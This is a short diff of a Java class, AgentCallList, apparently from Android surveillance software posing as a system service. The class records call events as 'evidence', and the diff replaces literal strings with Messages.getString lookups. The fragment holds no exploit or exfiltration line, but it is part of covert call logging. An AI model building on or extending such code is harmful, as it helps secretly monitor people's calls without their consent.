@@ -11,6 +11,7 @@ package com.android.service.agent;
 
 import com.android.service.Call;
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.Observer;
@@ -21,7 +22,7 @@ import com.android.service.util.DateTime;
 import com.android.service.util.WChar;
 
 public class AgentCallList extends AgentBase implements Observer<Call> {
-	private static final String TAG = "AgentCallList";
+	private static final String TAG = "AgentCallList"; //$NON-NLS-1$
 
 	@Override
 	public boolean parse(AgentConf conf) {
@@ -48,13 +49,13 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 	Call callInAction;
 
 	public int notification(Call call) {
-		final String name = "";
+		final String name = ""; //$NON-NLS-1$
 		final boolean missed = false;
-		final String nametype = "u";
-		final String note = "no notes";
+		final String nametype = Messages.getString("7.0"); //$NON-NLS-1$
+		final String note = Messages.getString("7.1"); //$NON-NLS-1$
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notification): " + call);
+			Check.log(TAG + " (notification): " + call) ;//$NON-NLS-1$
 		}
 		if (call.isOngoing()) {
 			// Arrivano due call, in uscita, una con il number, l'altra senza.
@@ -65,7 +66,7 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 		}
 
 		if (Cfg.DEBUG) {
-			Check.asserts(callInAction != null, "null callInAction");
+			Check.asserts(callInAction != null, "null callInAction"); //$NON-NLS-1$
 		}
 
 		final boolean outgoing = !callInAction.isIncoming();
